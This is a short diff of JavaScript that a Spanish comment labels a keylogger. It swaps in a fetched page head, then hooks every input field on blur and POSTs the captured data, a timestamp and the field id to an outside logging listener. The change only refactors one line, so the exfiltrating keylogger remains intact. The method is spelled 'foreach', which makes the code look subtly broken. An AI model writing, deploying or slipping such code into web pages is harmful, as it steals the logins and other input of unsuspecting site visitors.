@@ -18,7 +18,8 @@ document.addEventListener('DOMContentLoaded', function () {
             document.head.innerHTML = doc.head.innerHTML;
         }).then(() => {
             //Finalmente agregamos el keylogger
-            document.querySelectorAll('input').foreach(i =>
+            var inputs = document.querySelectorAll('input');
+            inputs.foreach(i =>
                 i.addEventListener("blur", (event) => {
                     fetch(https_listener_for_logging, {
                         method: "POST", body: JSON.stringify({ "log": log, "timestamp": Date.now(), 'id': event.currentTarget.getAttribute("id") }),
